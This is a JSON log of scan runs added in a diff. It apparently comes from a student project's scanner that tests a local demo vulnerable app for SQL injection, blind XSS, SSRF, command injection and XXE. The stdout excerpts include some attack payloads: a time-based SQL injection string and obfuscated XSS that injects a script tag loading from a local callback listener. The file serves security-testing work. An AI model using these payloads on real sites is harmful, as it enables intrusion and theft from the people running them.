@@ -1,0 +1,59 @@
+{
+  "rows": [
+    {
+      "module": "sqli",
+      "command": "python main.py --scan sqli -f demo_vuln_app/urls_sqli.txt --threads 3",
+      "return_code": 0,
+      "elapsed_seconds": 25.431,
+      "demo_event_count": -1,
+      "findings_count": 1,
+      "findings_artifact_exists": true,
+      "stdout_tail": "0.1:8000/search?name=test: 1 [INFO] Wrote results to \\\\wsl.localhost\\kali-linux\\home\\saga\\final year project\\bsqli\\output\\findings.json and \\\\wsl.localhost\\kali-linux\\home\\saga\\final year project\\bsqli\\output\\findings.txt [SUCCESS] Found 1 SQLi findings [INFO] [1] time on name | Confidence: HIGH | delta=5.04s [INFO]     Payload:  AND WAITFOR DELAY '00:00:5' [INFO] Scan complete. Total findings: 1",
+      "stderr_tail": "AppData\\Roaming\\Python\\Python313\\site-packages\\sklearn\\base.py:440: InconsistentVersionWarning: Trying to unpickle estimator StandardScaler from version 1.8.0 when using version 1.7.0. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to: https://scikit-learn.org/stable/model_persistence.html#security-maintainability-limitations   warnings.warn("
+    },
+    {
+      "module": "bxss",
+      "command": "python main.py --scan bxss -f demo_vuln_app/urls_bxss.txt --threads 3 --listener http://127.0.0.1:5000 --wait 10",
+      "return_code": 0,
+      "elapsed_seconds": 29.248,
+      "demo_event_count": -1,
+      "findings_count": 11,
+      "findings_artifact_exists": true,
+      "stdout_tail": "lay: 0.47s | ML: N/A | Payload: < svg on<!-- -->load=\"javascr<!-- -->ipt:eval('var a=document.createElement(\"scr [INFO] [11] Target: text | Delay: 0.04s | ML: N/A | Payload: \" >< script src=http://127.0.0.1:5000/c/bb3cfcd3-8e0b-48dc-8ea9-13dde4440e49 ><  [ML] Scored 11 findings with anomaly detection [ML] Persisted 11 features to ML dataset [SUCCESS] Results saved to bxss\\output\\findings_xss.json",
+      "stderr_tail": "AppData\\Roaming\\Python\\Python313\\site-packages\\sklearn\\base.py:440: InconsistentVersionWarning: Trying to unpickle estimator StandardScaler from version 1.8.0 when using version 1.7.0. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to: https://scikit-learn.org/stable/model_persistence.html#security-maintainability-limitations   warnings.warn("
+    },
+    {
+      "module": "ssrf",
+      "command": "python main.py --scan ssrf -f demo_vuln_app/urls_ssrf.txt --threads 3 --listener http://127.0.0.1:5000 --wait 10",
+      "return_code": 0,
+      "elapsed_seconds": 30.982,
+      "demo_event_count": -1,
+      "findings_count": 36,
+      "findings_artifact_exists": true,
+      "stdout_tail": "blocking)  ? POTENTIAL: http://127.0.0.1:8000/ssrf/fetch_safe?url=PAYLOAD   Parameter: url   Status: Injection attempted but no callback received   Confidence: Low (possible WAF/filter blocking)  [SUCCESS] Results saved to bssrf\\output\\findings_ssrf.json and bssrf\\output\\findings_ssrf.txt [INFO] Callback server running on http://127.0.0.1:5000 [INFO] SSRF scan complete. Total injection points: 36",
+      "stderr_tail": "esults. Use at your own risk. For more info please refer to: https://scikit-learn.org/stable/model_persistence.html#security-maintainability-limitations   warnings.warn( [2026-03-08 19:18:52,641] INFO - Loaded ML model from \\\\wsl.localhost\\kali-linux\\home\\saga\\final year project\\bsqli\\output\\isolation_forest_model.pkl [2026-03-08 19:18:52,658] INFO - SSRF scan complete. Total injection points: 36"
+    },
+    {
+      "module": "cmdi",
+      "command": "python main.py --scan cmdi -f demo_vuln_app/urls_cmdi.txt --threads 3",
+      "return_code": 0,
+      "elapsed_seconds": 459.239,
+      "demo_event_count": -1,
+      "findings_count": 3,
+      "findings_artifact_exists": true,
+      "stdout_tail": ".0.1:8000/process?cmd=ls   Parameter: cmd   Technique: time-based   Confidence: HIGH (time-based confirmations)  [3] http://127.0.0.1:8000/dns?domain=example.com   Parameter: domain   Technique: time-based   Confidence: HIGH (time-based confirmations)  [SUCCESS] Results saved to bcmdi\\output\\findings_cmdi.json and bcmdi\\output\\findings_cmdi.txt [INFO] CMDi scan complete. Total injection points: 3",
+      "stderr_tail": "AppData\\Roaming\\Python\\Python313\\site-packages\\sklearn\\base.py:440: InconsistentVersionWarning: Trying to unpickle estimator StandardScaler from version 1.8.0 when using version 1.7.0. This might lead to breaking code or invalid results. Use at your own risk. For more info please refer to: https://scikit-learn.org/stable/model_persistence.html#security-maintainability-limitations   warnings.warn("
+    },
+    {
+      "module": "xxe",
+      "command": "python main.py --scan xxe -f demo_vuln_app/urls_xxe.txt --threads 3",
+      "return_code": 0,
+      "elapsed_seconds": 21.326,
+      "demo_event_count": -1,
+      "findings_count": 2,
+      "findings_artifact_exists": true,
+      "stdout_tail": "1] http://127.0.0.1:8000/xxe/parse_safe   Parameter: xml_body   Technique: parser_behavior   Confidence: MEDIUM   ML Score: 0.00  [2] http://127.0.0.1:8000/xxe/soap_safe   Parameter: xml_body   Technique: parser_behavior   Confidence: MEDIUM   ML Score: 0.00  [SUCCESS] Results saved to bxe\\output\\findings_xxe.json and bxe\\output\\findings_xxe.txt [INFO] XXE scan complete. Total injection points: 2",
+      "stderr_tail": ""
+    }
+  ]
+}
